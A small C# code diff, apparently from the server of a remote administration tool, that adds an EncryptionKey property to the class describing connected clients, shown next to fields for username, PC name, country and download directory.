@@ -22,6 +22,7 @@ namespace Quasar.Server.Networking
         public string UserAtPc => $"{Username}@{PcName}";
         public string CountryWithCode => $"{Country} [{CountryCode}]";
         public string Tag { get; set; }
+        public string EncryptionKey { get; set; }
 
         public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
                                                ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
